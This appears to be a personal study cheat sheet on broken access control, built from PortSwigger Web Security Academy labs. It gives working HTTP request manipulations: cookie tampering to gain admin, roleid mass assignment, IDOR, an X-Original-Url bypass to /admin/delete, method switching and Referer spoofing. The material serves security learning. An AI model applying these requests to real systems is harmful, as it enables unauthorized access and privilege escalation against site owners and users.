# Broken Access Control
# Introduction 
vulnerabilities arise when users can act outside of their intended permissions. This typically leads to sensitive information disclosure, unauthorized access and modification or destruction of data
## How to Find ? 
- Identify all the instances where the web app appears to be interacting with the OS 
	- URL params 
	- hidden params 
	- cookies 
- Use accounts from each privileged level 
- manipulate these params 
- use Autorize extension in burp 
	- do the request from 
		- high privileged perspective 
		- unauthenticated perspective 
		- low privileged perspective 
## How to Exploit ? 
1. check for robots file => robots.txt or robots.txt.php
1. Do some fuzzing  => some hidden panels may be revealed 
```shell
ffuf -w wordList:FUZZ -u https://0a98006503ab7fed811f716000d600e3.web-security-academy.net/FUZZ
```
2. check the source code and js files, u may find juicy files and paths 
3. manipulate the requests headers
```
Cookie: Admin=false; session=t4QBqUFykVmAxaNQHkuUESMmxVNnCUk4
```
change any sus cookies values 
```
Cookie: Admin=true; session=t4QBqUFykVmAxaNQHkuUESMmxVNnCUk4
```
4. change any data set to user via POST requests
Request =>
```
POST /my-account/change-email HTTP/2
Host: 0a31005a03f94fda8212e330005100e7.web-security-academy.net

{
"email":"wiener@admin-user.net"
}
```
Response => 
```
{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "oFaJPhlb9gdZEYYaNNRDtTRut5DupfQl",
  "roleid": 1
}
```
try to set the roleid to 2, edit the request as follows 
Request 2 
```
POST /my-account/change-email HTTP/2
Host: 0a31005a03f94fda8212e330005100e7.web-security-academy.net

{
"email":"wiener@admin-user.net",
"roleid":2
}
```
Response 2
```
{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "oFaJPhlb9gdZEYYaNNRDtTRut5DupfQl",
  "roleid": 2
}
```
5. Manipulate requests with Get methods - URL params
```
GET /my-account?id=uraccount HTTP/2
```
change it to 
```
GET /my-account?id=victim-account HTTP/2
```
6. If the URL params are unpredictable 
Request 
```
GET /my-account?id=029740ef-941d-4352-afab-1f12afc93f7a
```
look around for a way to leak the victims id, like showing their profile if u where friends, etc ...
7. when u try to do horizontal access, always check the 302 body 
8. check for chats with others, u may access others chats
9. use X-Original-Url Header 
```
GET /?username=carlos HTTP/2
Host: 0a710090038c3ab380b96cb600c6009e.web-security-academy.net
Cookie: session=zBHZKjCuzwnjvMxcSrARdHiOc2rggY1n 
X-Original-Url: /admin/delete
```
10. Change the Request method, it may bypass some unauthorized activities 
Request 1 
```
POST /admin-roles HTTP/2
Host: 0a2f0037032bc4018133110f003d00fd.web-security-academy.net
Cookie: session=pjy7bHAusN4suXwVHS5jIdNv8BZktSze
```
Request 2 
```
PUT/GET /admin-roles HTTP/2
Host: 0a2f0037032bc4018133110f003d00fd.web-security-academy.net
Cookie: session=attacker-session
```
12.  Multi-step process with no access control on one step => confirmation steps, etc ..
13. There may be a referral header that tells the server u r authorized
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=attacker-session
Referer: https://0a52003f03645cf0826542f300eb00ce.web-security-academy.net/admin
```
